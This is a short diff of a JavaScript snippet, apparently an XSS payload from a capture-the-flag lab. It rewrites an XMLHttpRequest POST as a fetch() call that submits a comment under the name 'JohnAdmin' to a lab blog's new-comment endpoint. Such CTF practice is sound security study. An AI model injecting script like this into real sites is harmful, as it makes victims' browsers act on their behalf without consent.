@@ -1,13 +1,9 @@
-let xhr = new XMLHttpRequest();
-xhr.open("POST", "http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment");
+let formData = new FormData();
+formData.append('name', 'JohnAdmin');
+formData.append('comment', 'John123');
 
-
-xhr.onreadystatechange = function () {
-  if (xhr.readyState === 4) {
-    console.log(xhr.status);
-    console.log(xhr.responseText);
-  }};
-
-let data = "name=panvaxss&comment=helloworld2112";
-
-xhr.send(data);
+fetch("http://blog.952e4bd6-959.ctf.one.dr.punksecurity.cloud:5000/new-comment",
+    {
+        body: formData,
+        method: "post"
+    });
